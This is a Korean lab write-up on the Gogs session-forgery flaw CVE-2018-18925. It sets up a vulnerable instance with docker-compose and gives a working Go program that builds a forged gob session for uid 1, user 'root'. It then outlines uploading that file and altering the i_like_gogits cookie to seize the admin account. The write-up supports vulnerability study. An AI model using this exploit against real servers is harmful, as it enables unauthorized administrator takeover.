# Gogs 원격코드실행취약점 (CVE-2018-18925)


Gogs 0.11.66 및 이전버전과 Gitea 및 이전버전에 대해 취약점이 발견되었습니다. 
Sessionid 에 대한 검증이 없어, Sessionid 를 위조를 통해 임의의 계정에 로그인이 가능합니다.
임의의 파일을 읽을 수 있고 또 파일의 권한을 가지고 있어 악의적인 행위가 가능합니다.

참고：

- https://github.com/gogs/gogs/issues/5469
- https://github.com/j4k0m/CVE-2018-18925


## 환경 설정

docker-compose 를 통해 해당 취약 버전의 gogs 를 실행합니다.

```
docker-compose up -d
```

정상적으로 작동이 되었다면 http://{ip-address}:3000 으로 페이지에 접속할 수 있습니다.

최초 설정을 할때 SQLite3 으로 설정후 docker-compose restart 을 통해 재시작합니다. 재시작을 하지 않을경우 세션이 메모리에 저장이 되기에 문제가 발생합니다.

## 취약점

Gog속에 넣을 go랭 Session 파일 생성：

```go
package main

import (
    "bytes"
    "encoding/gob"
    "encoding/hex"
    "fmt"
    "io/ioutil"
    "os"
)

func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
    for _, v := range obj {
        gob.Register(v)
    }
    buf := bytes.NewBuffer(nil)
    err := gob.NewEncoder(buf).Encode(obj)
    return buf.Bytes(), err
}

func main() {
    var uid int64 = 1
    obj := map[interface{}]interface{}{"_old_uid": "1", "uid": uid, "uname": "root"}
    data, err := EncodeGob(obj)
    if err != nil {
        fmt.Println(err)
    }
    err = ioutil.WriteFile("data", data, os.O_CREATE|os.O_WRONLY)
    if err != nil {
        fmt.Println(err)
    }
    edata := hex.EncodeToString(data)
    fmt.Println(edata)
}
```
임의로 uid = 1 uname 을 root 로 지정.

기본적으로 gogs 는  /data/gogs/data/tmp/local-repo/[REPO_ID]/[FILENAME] 안에 파일을 저장을 합니다.
이를 이용해 i_like_gogits cookie 값을 변조를 통해 관리자 권한을 탈취가 가능합니다.

작동방식은 모종의 파일을 업로드 , 그것을 통한 DB에서의 파일위치 확인 , REPO_ID 변조를 통한 아이디 변경, 이후 권한 탈취 로 진행되는것으로 보입니다